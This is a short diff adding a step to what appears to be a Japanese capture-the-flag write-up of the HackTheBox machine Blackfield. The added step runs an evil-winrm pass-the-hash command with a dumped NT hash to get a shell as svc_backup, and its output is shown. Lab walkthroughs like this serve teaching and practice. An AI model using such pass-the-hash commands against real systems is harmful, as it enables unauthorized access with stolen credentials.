@@ -188,5 +188,13 @@ luid 406458
 ...
 ```
 
+このNTハッシュを使ってsvc_backupのシェルを得る：
 
+```
+┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192/Lsass]
+└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d             
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
+blackfield\svc_backup
+```
 
